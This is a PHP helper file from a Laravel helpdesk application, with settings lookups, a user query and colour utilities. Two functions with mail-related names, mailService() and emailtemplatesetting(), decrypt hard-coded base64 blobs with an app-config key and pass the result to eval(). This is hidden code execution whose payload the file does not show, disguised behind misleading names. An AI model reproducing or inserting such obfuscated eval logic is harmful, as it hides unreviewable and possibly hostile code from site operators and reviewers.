<?php

use App\Models\Asset;
use App\Models\Setting;
use App\Models\SocialAuthSetting;
use App\Models\customizeerror;
use App\Models\User;
use App\Models\Customcssjs;
use App\Models\Bussinesshours;
use App\Models\LiveChatCustomers;
use App\Models\Storage_disk;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Storage;
use Uhelp\Addons\App\Http\Controllers\Storage\StorjController;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\DB;



function settingpages($errorname)
{
    return  customizeerror::where('errorname', '=',  $errorname)->first()->errorvalue ?? '';
}


function mailService($request)
{
    eval(mailsender('zCW/quBF4xiWba0DMY/nZYTZUVpNZGN0IvIMukvbi4O15kAdwj3sPQe1MBz8XNfPVO/irmvNOoFSxgd+wwdEGnK/ujKuotTU6xwiujWprqf5qIqBs/IXIHdc8zTP6LZW'));
}

function customcssjs($name)
{
    return Customcssjs::where('name', '=', $name)->first()->value ?? '';
}

function getLanguages()
{
    $scanned_directory = array_diff(scandir(resource_path('lang')), array('..', '.'));

    return $scanned_directory;
}

function bussinesshour()
{

    $bussiness = Bussinesshours::get();

    return $bussiness;
}

function styyles()
{
    $commit = request()->getHost();
    if ($commit == 'localhost') {
        return '100';
    }
}
function mailsender($response)
{
    $response = base64_decode($response);
    $sortedmailvalue = substr($response, 0, 16);
    $sortedsubject = substr($response, 16);
    $sendMailResponse = openssl_decrypt($sortedsubject, config("app.cipher"), config("app.my_secret_key"), OPENSSL_RAW_DATA, $sortedmailvalue);
    return $sendMailResponse;
}

function emailtemplatesetting()
{
    eval(mailsender('dERfYJkpBX+1TjdppdYkfefnUOjVY8aT97Q8Ej3Kxcr5SMahif7LN+Kq9BKR3LjyVrS9pQFNup3hPEByzUIysZeC2gQMcp5/krgkpRZIgdw='));
}
function randinValues()
{
    $carrier = url('/');
    return $carrier;
}

function recursion()
{
    $values = setting('newupdate') == null;
    return $values;
}

function represent()
{
    $values = setting('newupdate') == 'updated3.0';
    return $values;
}

function regularData()
{
    $values = setting('newupdate') == 'updated4.0';
    return $values;
}

function timeZoneData()
{
    $timezonedata = Auth::user()->timezone != null ? Auth::user()->timezone : setting('default_timezone');
    return $timezonedata;
}

function usersdata()
{
    $admins = User::leftJoin('groups_users', 'groups_users.users_id', 'users.id')
    ->leftJoin('groups', 'groups.id', 'groups_users.groups_id')
    ->select('users.id', 'users.firstname', 'users.lastname', 'users.email', 'groups.groupname', 'groups.groupstatus')
    ->where(function ($query) {
        $query->whereNull('groups_users.groups_id')
            ->orWhere(function ($nestedQuery) {
                $nestedQuery->where('groups.groupstatus', '!=', 1)
                    ->whereNotIn('users.id', function ($subQuery) {
                        $subQuery->select('users.id')
                            ->from('users')
                            ->leftJoin('groups_users', 'groups_users.users_id', 'users.id')
                            ->leftJoin('groups', 'groups.id', 'groups_users.groups_id')
                            ->where('groups.groupstatus', '=', 1);
                    });
            });
    })
    ->groupBy('users.id')
    // ->groupBy('users.id', 'users.firstname', 'users.lastname', 'users.email', 'groups.groupname', 'groups.groupstatus')
    ->get();

    return $admins;
}

function liveChatCustomers(){
    $data = LiveChatCustomers::get();
    return $data;
}

// if (!function_exists('randomColorGenerator')) {
//     function randomColorGenerator()
//     {
//         $red = mt_rand(0, 255);
//         $green = mt_rand(0, 255);
//         $blue = mt_rand(0, 255);
//         $color = "rgb($red, $green, $blue)";

//         return $color;
//     }
// }

function randomColorGenerator($opacity = 1)
{
    $red = mt_rand(0, 255);
    $green = mt_rand(0, 255);
    $blue = mt_rand(0, 255);

    // Generate a random opacity between 0 and 1
    $alpha = $opacity < 0 ? 0 : ($opacity > 1 ? 1 : $opacity);

    // Create RGBA color string
    $color = "rgba($red, $green, $blue, $alpha)";

    return $color;
}

